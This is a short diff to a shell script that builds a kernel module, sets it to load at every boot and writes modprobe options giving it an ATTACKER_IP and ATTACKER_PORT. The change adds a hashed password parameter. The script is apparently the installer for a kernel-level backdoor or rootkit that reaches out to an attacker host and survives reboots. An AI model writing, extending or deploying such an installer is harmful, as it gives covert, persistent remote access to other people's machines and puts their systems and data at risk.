@@ -10,6 +10,7 @@ MODPROBE_CONF="/etc/modprobe.d/${MODULE_NAME}.conf"
 MODULES_LOAD="/etc/modules-load.d/${MODULE_NAME}.conf"
 ATTACKER_IP="192.168.1.30"
 ATTACKER_PORT="5555"
+HASHED_PASSWORD="dd58add07f93b3ad6ffcebf0fbacf16a15260793cae2f8b00a5fe701d8d85676"
 
 echo "[*] Building kernel module..."
 make -C "$SRC_DIR"
@@ -28,7 +29,7 @@ echo "[*] Configuring automatic loading at boot"
 echo "$MODULE_NAME" | sudo tee "$MODULES_LOAD" > /dev/null
 
 echo "[*] Setting module parameters"
-echo "options $MODULE_NAME attacker_ip=$ATTACKER_IP attacker_port=$ATTACKER_PORT" \
+echo "options $MODULE_NAME attacker_ip=$ATTACKER_IP attacker_port=$ATTACKER_PORT" password=$HASHED_PASSWORD \
     | sudo tee "$MODPROBE_CONF" > /dev/null
 
 echo "[*] Loading module now"
